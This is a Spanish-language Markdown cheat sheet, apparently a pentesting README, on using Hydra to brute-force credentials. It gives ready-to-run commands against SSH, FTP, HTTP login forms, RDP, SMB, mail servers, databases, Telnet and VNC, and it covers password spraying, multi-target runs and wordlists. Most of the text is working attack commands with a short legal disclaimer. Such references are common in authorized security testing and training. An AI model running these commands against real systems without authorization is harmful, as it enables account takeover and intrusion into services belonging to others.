<div align="center">

# 💥 Offensive Security
### Hydra — Fuerza Bruta de Credenciales

![Status](https://img.shields.io/badge/Status-Active-ff3c6e?style=for-the-badge&logo=statuspage&logoColor=white)
![Category](https://img.shields.io/badge/Category-Brute%20Force-ff6b00?style=for-the-badge&logo=hackthebox&logoColor=white)
![Platform](https://img.shields.io/badge/Platform-Linux%20%7C%20Windows-00d4ff?style=for-the-badge&logo=linux&logoColor=white)

</div>

---

> **¿Qué es Hydra?**
> Herramienta de brute force paralelo para +50 protocolos. Permite ataques de diccionario, credential stuffing y password spraying contra servicios de red.

> [!WARNING]
> **Aviso Legal y Ético:** Uso exclusivo en entornos con **autorización explícita por escrito (RoE).** El uso no autorizado constituye un delito penal.

---

## 📑 Tabla de Contenidos

| # | Sección |
|---|---------|
| 01 | [🔧 Flags & Sintaxis](#-flags--sintaxis) |
| 02 | [🔐 SSH](#-ssh) |
| 03 | [📁 FTP](#-ftp) |
| 04 | [🌐 HTTP — GET & POST Forms](#-http--get--post-forms) |
| 05 | [🖥️ RDP & SMB](#️-rdp--smb) |
| 06 | [📧 SMTP, IMAP, POP3](#-smtp-imap-pop3) |
| 07 | [🗄️ Bases de Datos](#️-bases-de-datos) |
| 08 | [📺 Telnet & VNC](#-telnet--vnc) |
| 09 | [🧩 Técnicas Avanzadas](#-técnicas-avanzadas) |
| 10 | [🗺️ Referencia de Protocolos](#️-referencia-de-protocolos) |

---

## 🔧 Flags & Sintaxis

![Tool](https://img.shields.io/badge/Tool-Hydra-ff3c6e?style=flat-square&logo=linux&logoColor=white)

**Estructura:**
```bash
hydra [OPCIONES] <TARGET> <SERVICIO>
hydra [OPCIONES] <SERVICIO>://<TARGET>
```

### Referencia de Flags

| Flag | Descripción |
|------|-------------|
| `-l <user>` | Usuario único |
| `-L <file>` | Lista de usuarios |
| `-p <pass>` | Contraseña única |
| `-P <file>` | Lista de contraseñas |
| `-C <file>` | Formato `usuario:contraseña` (combinado) |
| `-t <N>` | Threads paralelos (default: 16) |
| `-T <N>` | Threads globales (default: 64) |
| `-f` | Parar al primer hit válido |
| `-F` | Parar al primer hit en cualquier host |
| `-V` | Verbose — mostrar cada intento |
| `-v` | Verbose — solo hits |
| `-s <port>` | Puerto personalizado |
| `-S` | SSL/TLS |
| `-o <file>` | Guardar resultados a archivo |
| `-R` | Reanudar sesión anterior |
| `-e nsr` | Probar: `n`=null, `s`=user=pass, `r`=reverse |
| `-u` | Iterar usuarios por pass (en vez de passes por user) |
| `-x min:max:charset` | Generar contraseñas en bruto |

---

## 🔐 SSH

```bash
# Usuario único, lista de passwords
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.10

# Lista de usuarios y passwords
hydra -L users.txt -P passwords.txt ssh://192.168.1.10 -t 4

# Puerto no estándar
hydra -l admin -P passwords.txt -s 2222 ssh://192.168.1.10 -V

# Parar al primer éxito
hydra -l root -P /usr/share/wordlists/rockyou.txt -f ssh://192.168.1.10

# Probar usuario=contraseña
hydra -L users.txt -e nsr ssh://192.168.1.10
```

> [!TIP]
> SSH limita conexiones. Usar `-t 4` para evitar bloqueos.

---

## 📁 FTP

```bash
# Básico
hydra -l admin -P passwords.txt ftp://192.168.1.10

# Con threads y verbose
hydra -L users.txt -P passwords.txt ftp://192.168.1.10 -t 10 -V

# Puerto no estándar
hydra -l ftpuser -P passwords.txt -s 2121 ftp://192.168.1.10
```

---

## 🌐 HTTP — GET & POST Forms

### HTTP Basic Authentication

```bash
hydra -l admin -P passwords.txt http-get://192.168.1.10/admin/
hydra -L users.txt -P passwords.txt 192.168.1.10 http-get /protected/
```

### HTTP POST Form

```bash
# Sintaxis: "/ruta:params:mensaje_de_fallo"
hydra -l admin -P passwords.txt 192.168.1.10 \
  http-post-form "/login.php:user=^USER^&pass=^PASS^:Invalid credentials"

# Con cookies de sesión
hydra -l admin -P passwords.txt 192.168.1.10 \
  http-post-form "/login:username=^USER^&password=^PASS^:Login failed" \
  -H "Cookie: PHPSESSID=abc123"

# HTTPS
hydra -l admin -P passwords.txt https-post-form \
  "192.168.1.10/login:user=^USER^&pass=^PASS^:Incorrect"

# Lista de usuarios + passwords, verbose
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt \
  domain.htb http-post-form \
  "/path/index.php:name=^USER^&password=^PASS^&enter=Sign+in:Login name or password is incorrect" -V
```

> [!IMPORTANT]
> `^USER^` y `^PASS^` son los marcadores de Hydra. El tercer campo `:mensaje:` es la cadena que aparece cuando el login **falla** — no cuando tiene éxito.

---

## 🖥️ RDP & SMB

### RDP

```bash
hydra -V -f -L users.txt -P passwords.txt rdp://192.168.1.10
hydra -l administrator -P passwords.txt rdp://192.168.1.10 -t 1
```

> [!NOTE]
> RDP = 1 thread (`-t 1`). Más threads → bloqueo de cuenta o errores.

### SMB

```bash
hydra -l Administrator -P passwords.txt smb://192.168.1.10 -t 1
hydra -L users.txt -P passwords.txt 192.168.1.10 smb -t 1 -V
```

---

## 📧 SMTP, IMAP, POP3

### SMTP

```bash
hydra -l user@domain.com -P passwords.txt smtp://192.168.1.10
hydra -l user@domain.com -P passwords.txt -s 587 smtp://192.168.1.10 -S -V
hydra -L users.txt -P passwords.txt smtp://mail.domain.com -V
```

### IMAP

```bash
hydra -l user -P passwords.txt imap://192.168.1.10
hydra -l user -P passwords.txt -s 993 -S imap://192.168.1.10 -V   # IMAPS
```

### POP3

```bash
hydra -l user -P passwords.txt pop3://192.168.1.10
hydra -l user -P passwords.txt -s 995 -S pop3://192.168.1.10      # POP3S
```

---

## 🗄️ Bases de Datos

### MySQL

```bash
hydra -l root -P passwords.txt mysql://192.168.1.10
hydra -L users.txt -P passwords.txt 192.168.1.10 mysql
```

### PostgreSQL

```bash
hydra -l postgres -P passwords.txt postgres://192.168.1.10
hydra -L users.txt -P passwords.txt 192.168.1.10 postgres
```

### MSSQL

```bash
hydra -l sa -P passwords.txt mssql://192.168.1.10
```

### Redis

```bash
hydra -P passwords.txt redis://192.168.1.10:6379
```

---

## 📺 Telnet & VNC

### Telnet

```bash
hydra -l root -P passwords.txt telnet://192.168.1.10
hydra -L users.txt -P passwords.txt 192.168.1.10 telnet -t 32 -V
```

### VNC

```bash
hydra -P passwords.txt vnc://192.168.1.10
hydra -P passwords.txt -s 5901 vnc://192.168.1.10 -V
```

---

## 🧩 Técnicas Avanzadas

### `[01]` Formato Combinado `usuario:pass`

```bash
hydra -C credentials.txt ssh://192.168.1.10
# credentials.txt:
# admin:admin
# root:toor
# user:password123
```

### `[02]` Multi-Target

```bash
hydra -L users.txt -P passwords.txt -M targets.txt ssh
```

### `[03]` Generación de Contraseñas en Bruto

```bash
# min:max:charset
hydra -l admin -x 4:6:aA1 ssh://192.168.1.10    # 4-6 chars alfanumérico
hydra -l root -x 6:8:a ssh://192.168.1.10         # 6-8 chars solo minúsculas
```

### `[04]` Guardar y Reanudar

```bash
# Guardar resultados
hydra -l admin -P passwords.txt ssh://192.168.1.10 -o resultados.txt

# Reanudar sesión interrumpida
hydra -R
```

### `[05]` Password Spraying (1 pass → muchos users)

```bash
# Probar misma contraseña contra lista de usuarios — evita bloqueos
hydra -L users.txt -p "Password123!" rdp://192.168.1.10 -t 1 -W 3
```

---

## 🗺️ Referencia de Protocolos

| Protocolo | Módulo Hydra | Puerto Default |
|-----------|-------------|----------------|
| SSH | `ssh` | 22 |
| FTP | `ftp` | 21 |
| HTTP Basic | `http-get` | 80 |
| HTTP Form | `http-post-form` | 80 |
| HTTPS Basic | `https-get` | 443 |
| HTTPS Form | `https-post-form` | 443 |
| RDP | `rdp` | 3389 |
| SMB | `smb` | 445 |
| SMTP | `smtp` | 25/587 |
| SMTPS | `smtp` + `-S` | 465 |
| IMAP | `imap` | 143 |
| IMAPS | `imap` + `-S` | 993 |
| POP3 | `pop3` | 110 |
| MySQL | `mysql` | 3306 |
| PostgreSQL | `postgres` | 5432 |
| MSSQL | `mssql` | 1433 |
| Redis | `redis` | 6379 |
| Telnet | `telnet` | 23 |
| VNC | `vnc` | 5900 |
| LDAP | `ldap3[-{cram,digest}md5][s]` | 389 |
| Cisco | `cisco` | — |

---

> [!TIP]
> **Wordlists recomendadas:**
> - `/usr/share/wordlists/rockyou.txt`
> - `/usr/share/wordlists/dirb/common.txt`
> - `/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt`
> - `/usr/share/seclists/Usernames/Names/names.txt`
